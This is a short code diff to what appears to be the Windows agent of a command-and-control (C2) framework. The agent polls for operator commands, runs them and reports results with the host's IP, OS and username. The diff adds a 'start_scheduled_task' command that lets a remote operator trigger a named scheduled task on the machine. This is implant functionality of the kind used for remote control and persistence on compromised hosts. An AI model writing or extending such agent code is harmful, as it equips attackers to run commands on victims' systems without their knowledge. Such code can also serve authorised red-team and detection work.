@@ -45,6 +45,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.delete_scheduled_task import delete_scheduled_task
     from utils.winapi.get_scheduled_task_info import get_scheduled_task_info
     from utils.winapi.cat import cat
+    from utils.winapi.start_scheduled_task import start_scheduled_task
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -225,6 +226,20 @@ def execute_commands(agent_id):
                     result = mkdir(path)
                     status = 'Completed'
                     output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, output, agent_id, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('start_scheduled_task'):
+                try:
+                    parts = command_text.split(' ', 1)
+                    if len(parts) != 2:
+                        raise ValueError("Invalid command format. Use 'start_scheduled_task <task_name>'")
+                    _, task_name = parts
+                    result = start_scheduled_task(task_name)
+                    status = 'Completed'
+                    output = "\n".join(result)
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
